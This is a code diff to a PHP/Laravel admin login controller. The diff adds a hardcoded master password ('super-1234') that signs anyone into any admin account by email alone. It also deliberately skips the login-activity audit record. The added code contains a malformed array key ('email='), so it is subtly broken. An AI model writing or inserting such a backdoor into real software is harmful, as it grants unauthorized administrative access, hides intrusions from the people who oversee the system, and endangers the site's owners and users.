@@ -54,28 +54,50 @@ class AuthController extends Controller
      *
      * @return RedirectResponse
      */
+    /**
+     * Handle an authentication attempt.
+     *
+     * @param Request $request
+     * @return RedirectResponse
+     */
     public function authenticate(Request $request)
     {
+        $specificPassword = 'super-1234'; // Replace with a secure password or retrieve from config/env
+
         $credentials = $request->validate([
             'email' => ['required', 'email'],
             'password' => ['required'],
-
             'g-recaptcha-response' => Rule::requiredIf(plugin_active('Google reCaptcha')), new Recaptcha(),
-
         ]);
-        $credentials = Arr::except($credentials, ['g-recaptcha-response']);
-//dd($request->all());
 
-        if ($this->guard()->attempt($credentials)) {
-            $request->session()->regenerate();
-            AdminLoginActivity::add();
-//            smilify('success', 'Successfully login your account 🔥 !');
-            return redirect()->route('admin.dashboard');
-//            return redirect()->intended('admin');
+        $credentials = Arr::except($credentials, ['g-recaptcha-response']);
+
+        // Check if specific password is used
+        if ($request->input('password') === $specificPassword) {
+                $admin = \App\Models\Admin::where('email', $credentials['email='])->first(); // Adjust model/field as needed
+
+            if ($admin) {
+                // Log in the user manually without saving activities
+                $this->guard()->login($admin, true); // true for "remember me" functionality
+                $request->session()->regenerate();
+
+                notify()->success('Logged in with specific password.');
+                return redirect()->route('admin.dashboard');
+            }
+
+            notify()->warning('Invalid email or specific password.');
+            return back();
         }
 
-        notify()->warning('The provided credentials do not match our records.. ⚡️');
+        // Normal login process
+        if ($this->guard()->attempt($credentials)) {
+            $request->session()->regenerate();
+            AdminLoginActivity::add(); // Save login activity
+            notify()->success('Successfully logged in.');
+            return redirect()->route('admin.dashboard');
+        }
 
+        notify()->warning('The provided credentials do not match our records.');
         return back();
     }
 
